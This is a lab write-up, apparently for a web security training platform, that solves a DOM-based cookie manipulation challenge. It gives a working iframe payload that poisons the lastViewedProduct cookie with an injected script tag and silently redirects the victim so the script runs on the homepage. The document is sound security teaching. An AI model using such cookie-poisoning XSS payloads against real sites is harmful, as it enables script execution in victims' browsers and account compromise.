## DOM-based cookie manipulation

This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.

## Notes

- Exploit Server
- `lastViewedProduct` cookie

## Resume

1. Inspect client-side cookie behavior
2. Identify the `lastViewedProduct` cookie
3. Observe cookie value reflects visited product URL
4. Inject malicious payload into product URL
5. Force victim to save poisoned cookie
6. Trigger XSS when homepage loads

## Solve

The application stores the URL of the last visited product page inside a client-side cookie named:

```
lastViewedProduct
```

The home page later reads this cookie and uses its value in the DOM without proper sanitization.

Because the cookie value is based directly on the visited product URL, we can poison it with a malicious payload.

The following iframe is used on the exploit server:

```html
<iframe src="https://0ad50066039d78ca80de088d00da00be.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0ad50066039d78ca80de088d00da00be.web-security-academy.net';window.x=1;">
```

Breakdown of the payload:

- The iframe first loads a malicious product URL
- The URL contains:

```html
'><script>print()</script>
```

which injects a script payload into the stored cookie value.

The application saves the full malicious URL into:

```
lastViewedProduct
```

The iframe then immediately redirects the victim back to the homepage using:

```javascript
if(!window.x)
    this.src='https://0ad50066039d78ca80de088d00da00be.web-security-academy.net';

window.x=1;
```

This prevents an infinite reload loop while making the attack invisible to the victim.

When the homepage loads, the application reads the poisoned cookie and inserts its value into the DOM.

As a result, the browser executes:

```javascript
print()
```

resulting in DOM-based XSS.

```html
<iframe src="https://0ad50066039d78ca80de088d00da00be.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0ad50066039d78ca80de088d00da00be.web-security-academy.net';window.x=1;">
```

The victim unknowingly stores a malicious `lastViewedProduct` cookie.

When the homepage later reads this cookie, the injected script executes, confirming the DOM XSS vulnerability.